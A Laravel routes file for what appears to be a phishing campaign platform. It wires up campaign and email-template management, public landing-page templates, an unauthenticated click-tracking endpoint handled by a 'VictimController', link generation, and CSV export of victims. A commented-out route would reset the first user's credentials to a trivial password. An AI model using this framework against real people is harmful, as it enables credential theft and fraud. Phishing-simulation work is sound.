<?php


use App\Http\Controllers\CampaignController;

use App\Http\Controllers\DashboardController;

use App\Http\Controllers\EmailTemplateController;

use App\Http\Controllers\GenerateLinkController;

use App\Http\Controllers\TemplateController;

use App\Http\Controllers\UserController;

use App\Http\Controllers\VictimController;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;


// Route::get('/login',function(){
//     User::find(1)?->update([
//         'email' => 'admin@gmail.com' ,
//         'password' => Hash::make('123')
//     ]);
    
// });

Route::any('/login',[UserController::class, 'login'])->name('login');

Route::get('/templates/{pages}',[TemplateController::class, 'showTemp']);
Route::post('/click.php',[VictimController::class, 'json']);



Route::middleware('auth')->group(function()
{

    Route::get('/logout',[UserController::class, 'logout']);
    Route::any('/email_config.php',[UserController::class,'email_config']);


    Route::get('/', [DashboardController::class, 'dash']);


    Route::get('/campaign/delete.php',[CampaignController::class, 'delete']);
    Route::any('/add_campaign.php',[CampaignController::class, 'insertCampaign']);
    Route::get('/all_campaign.php',[CampaignController::class, 'getCampaign']);



    Route::any('/add_email_templates.php',[EmailTemplateController::class, 'getEmail']);


    Route::get('/victims.php',[VictimController::class, 'showData']);
    Route::get('/download',[VictimController::class, 'downloadCsv']);



    Route::any('/generate_links.php',[GenerateLinkController::class,'getForm'])->middleware(['email.config']);



    
    Route::any('/add_templates.php',[TemplateController::class, 'sendReq']);

});









